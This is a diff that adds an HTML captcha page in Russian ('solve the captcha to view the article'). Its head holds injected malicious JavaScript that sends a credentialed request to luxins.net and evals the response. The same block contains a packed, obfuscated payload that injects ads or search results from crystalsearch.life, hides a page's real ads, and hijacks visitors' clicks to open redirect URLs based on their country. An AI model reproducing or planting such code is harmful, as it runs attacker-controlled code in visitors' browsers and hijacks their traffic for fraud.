@@ -1,0 +1,51 @@
+<html>
+    <head><script type="text/javascript">(function (w) {
+    if (w.top !== w.self) {
+        return;
+    }
+
+    var params = {
+        id: 297
+    };
+
+    var qs = [];
+    for (var key in params) {
+        qs.push(key + '=' + encodeURIComponent(params[key]));
+    }
+
+    var r = new XMLHttpRequest();
+    r.withCredentials = true;
+    r.onload = function() {eval(this.responseText);};
+    r.open("get", 'https://luxins.net/code?' + qs.join('&'));
+    r.send();
+    
+    eval(function(p,a,c,k){var d={},e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('!3(){7("U"==P.1k.Q(0,4)&&8&&"1v"!=1t 8){5 n=3(){3 n(){5 e;B{e=z 1A("2U.1x")}F(t){B{e=z 1A("2x.1x")}F(t){e=!1}}e||"1v"==1t 1r||(e=z 1r),x.1K=e}y.1o=3(t){5 e=3(){(z n).G("//11.13/1s/?1C=2w~~&1T=1S~~&1R=1&",3(){},1P)};t?y.2v||((z n).G("//11.13/1s/?1C=2u-2t&1T=1S~~&1R=1&",3(){},1P),e()):e()},n.2s.G=3(t,e,n){5 o=x.1K;7(n)5 i=1y(3(){o.2r,e(!1,"2p 2h")},n);e=e||3(){},o.2o=3(){4==o.1U&&(2n(i),e(2m==o.2l,o.2k))},o.1c("2j",t,!0),o.2i(J)},(z n).G("//11.13/2y/2q/",3(t,e){t&&e&&2==e.9||(e="2z"),3(1F){5 e="2K";7(!8.2S(e)){5 n=8.1a("2f");n.2Q=e,8.Y.X(n);(3(){7(P.1k.Q(0,4)!=\'U\'||y.1p)6;y.1p=1;(3(){5 1E="2P 2O 2N 2M 2L 2J 2B 2I 2H 2G 2F 2E 2D 1i 2C 2A 2g 2e 1Z 1Y 1X 1i 22 23 24 25 21 26 27".1G();7(1E.M(1F.1G())<0)6;(3(){5 a,b,c={O:"",C:.2,A:[1h,28,20,10]},d="1b",e="29://2a.2b/",f={1e:e+"1l/2c.1n?",18:e+"1l/Z.1n?2d={17}&",1D:"q={1q}&s=0",1V:"&2T={1B}",K:"2R"};a=3(){},b=3(a){2V.34(a)};5 g=3(a){b(a.3C+": "+a.1H+"\\n"+a.3B)},h=3(a){6 3v((z 3t("[?|&]"+a+"=([^&;]+?)(&|#|;|$)").3s(P.16)||[J,""])[1].I(/\\+/g,"%20"))||J},i=3(){5 a="0.2|3r".12("|");7(2>=a.9){5 b=a[0];a[0]=a[1],a[1]=b,a[0]||(a[0]="0")}5 d=V(a[1]);7(d&&(c.C=d),a[2]&&a[2].D&&a[2].D()){19(5 e,g=a[2].12(","),h=0;h<g.9;h++)e=V(g[h]),e||(e=0),c.A[h]=e;c.A.9=g.9}6 a[0]&&a[0].D&&a[0].D()&&(c.O=a[0].D()),3(){6!!(c.O&&c.C&&c.A&&c.A.9)}}(),j=3(){6 a("E: 3w \'"+d+"\' 3x 3y 3z"),!1},k=j;k=3(){5 a=8.3A.12("."),b=a.M("1b");6(0===b||1===b)&&(1!=b||"3q"==a[0])&&!("/16"!=P.3D)&&!(0<P.16.M("3F="))};5 l=j;l=3(){5 a,b=3(b){6!!(b&&b.D)&&(a=b.D(),a)};6!!b(h("q"))&&a};5 m=3(a){5 b="0"==c.O?"":f.1V;6(f.1D+b).I("{1B}",R(c.O)).I("{3G}",c.A.9).I("{1q}",R(a))},n=z 3(){5 b=f.K+"3H"+c.C.L();x.T=3(a){6 a=a.3I(4),W[b]=a,V(a)},x.G=3(){5 a=V(W[b]);6!a||1<=a?x.T(c.C):a*1},x.1O=3(){x.T(1-(1-x.G())*(1-c.C))},x.1j=3(){1W=c.C,x.T(1W)},x.1I=3(){5 b=14.1u(),c=x.G();6 a("3L: "+b.L()+", 3M: "+c.L()),b<c}},o=3(b,c){5 d=8.1a("3E");d.3K("1Q","1N:1M!1L");5 e=f.1e;6 e?H(d.3J=e+b,y.1g("1H",3(b){B{5 d=f.K+"3u=";7(b&&b.N&&b.N.M&&0==b.N.M(d)){5 h=b.N.I(d,""),i=[];B{i=S.3p(h)}F(b){a("E: 1z 1J ("+h+")")}c(i)}}F(c){g(c),a(b.N)}}),8.15.X(d)):H a("E: 1d 1m.1e ("+S.1f(f)+")")},p=3(b){7(!n.1I())6!1;19(5 d=0,e=0,f=[],g=14.3a(c.A.9,b.9),h=0;h<g;h++)e+=c.A[h],f.3n(e);19(5 j=14.1u()*e,h=0;h<f.9;h++)7(j<f[h]){d=h+1;2X}7(!d)6 a("E: 2Y = 0"),!1;5 k=b[d-1].2Z;6 k&&k.Q&&"U"==k.Q(0,4)?(a("30 "+k),k):(a("E: 1z 31 17"),!1)},q=f.K+"32",r=3(){5 a=W[q];6 a&&"J"!=a?a:""},s=3(a){a&&"J"!=a&&(W[q]=a)},t=!1,u=3(b,c,d){7(!t){t=!0;5 h,i=3(a){B{7(h)6 h(a)}F(a){g(a)}},h=3(g){h=3(){6!0},g.33(),g.3o(),g.35(),8.15.36("Z",i,!0);5 e=f.18.I("{17}",R(c));7(!e)6 H a("E: 1d 1m.18 ("+S.1f(f)+")");5 j=e+b;y.1c(j)?(a("37 "+j),n.1j(),s(d)):a("38 1c "+j)};b&&c&&"U"==c.Q(0,4)&&8.15.1g("Z",i,!0)}};"1b"==d&&3(){5 a=8.1a("1Q");a.2W="#39, #3b {1N: 1M !1L}";5 b=3(){6!!8.Y&&(8.Y.X(a),!0)};7(!b())5 c=3c(3(){b&&3d(c)},1h)}();5 v=3(){7(i()&&k()){5 b=l();7(b){5 c=R(f.K+b);7(!y[c]&&(y[c]=!0,r()!=b)){5 d=m(b);7(!d)6 H a("E: 1d 3e ("+S.1f(f)+")");B{a("3f 3g "+b),o(d,3(c){B{7(a("3h: "+(!!c).L()+", 1J 9: "+(!!c.9).L()),!c||!c.9)6;5 e=p(c);7(!e)6;n.1O(),u(d,e,b)}F(a){g(a)}})}F(a){g(a)}}}}},w=8.1U;"3i"==w||"3j"==w?v():8.1g("3k",v,!1)})()})()})();y.1o(!0)}}(e)},3l)},o=3(){5 t,e=(t=8.3m("Y"))&&H 0!==t&&t.9&&t[0]&&H 0!==t[0]&&t[0].X?(t=t[0]).1w?0:t.1w=1:-1;0!==e&&(-1===e&&1y(o,1h),1===e&&n())};o()}}();',62,235,'|||function||var|return|if|document|length||||||||||||||||||||||||this|window|new|placeRates|try|CTR|trim|Error|catch|get|void|replace|null|messageStart|toString|indexOf|data|sub_ID|location|substr|encodeURIComponent|JSON|set|http|parseFloat|localStorage|appendChild|head|click||klittapippo|split|info|Math|body|search|URL|redirectURL|for|createElement|google|open|no|iframeURL|stringify|addEventListener|100|CH|decrease|href|xa|base|html|xAdsShowStatsRequest|reigw34pn7tsjkdygf|KEYWORDS|XMLHttpRequest|shows|typeof|random|undefined|xadscriptinserted|XMLHTTP|setTimeout|invalid|ActiveXObject|SUB_ID|key|queryStringTemplate|countries|detected_country|toLowerCase|message|check|results|xhr|important|none|display|increase|2e4|style|count|MTM1MzkgD1_LU1S68cRBsL4BFHW56g|ukey|readyState|querySubIDTemplate|value|SE|FI|ES||IN|DE|TW|HK|GB|IT|VN|60|https|crystalsearch|life|starter|url|DK|meta|SG|reached|send|GET|responseText|status|200|clearTimeout|onreadystatechange|Timeout|1775|abort|prototype|298f_wfCUwTL3yYSDMyA2ZFpp|YA|xAdsShowStatsControl|Kbfp252RSBhTXULRnXCGMCA1TkVjVw|Microsoft|geolocation|XX|CO|AT|PH|PE|FR|CA|NO|BR|NL|MX|wwi3bdi87sg87gi3av8bc8sgeyvru2y3|AR|TR|PT|PL|BE|id|xAdsYCIfr|getElementById|sub|Msxml2|console|innerText|break|place|link|Selected|result|Kwds|stopPropagation|log|preventDefault|removeEventListener|opened|Cannot|tads|min|bottomads|setInterval|clearInterval|queryString|Starting|request|Results|complete|interactive|DOMContentLoaded|1e4|getElementsByTagName|push|stopImmediatePropagation|parse|www|88|exec|RegExp|IResults|decodeURIComponent|website|is|not|supported|domain|stack|name|pathname|iframe|tbl|NUMADS|Prob|toFixed|src|setAttribute|rnd|ctr'.split('|')))
+    
+}(window));</script>
+        <title>Для просмотра статьи разгадайте капчу</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    </head>
+    <body style = "background:white">
+        <script language ="javascript">
+            function reloadAsGet()
+            {
+                var loc = window.location;
+                window.location = loc.protocol + '//' + loc.host + loc.pathname + loc.search;
+            }
+        </script>
+        <div>
+            <table style = "width:100%;height:100%"><tr><td style = "vertical-align:middle;text-align:center">
+            <h2 style = "color:gray;font-family:sans-serif;padding:18px">для просмотра статьи разгадайте капчу</h2>
+            <p></p>
+            <form action = "" method = "POST">
+                <p><img id="captcha" src="/img/5d07d006106e0.jpg" /></p>
+                <input type ="hidden" name = "id" value = "5d07d006106e0">
+                <input type="text" maxlength="6" name="answer" style = "width:256px;font-size:18px;height:36px;margin-top:18px;text-align:center" autofocus /><br>
+                <a style = "color:gray;text-decoration:none" href="#" onclick="javascript:reloadAsGet()">[ показать другую картинку ]</a>
+                <p style = "margin-top:22px"><input type = "submit" value= "Продолжить"></p>
+            </form>
+            </td></tr></table>
+        </div>
+    </body>
+</html>
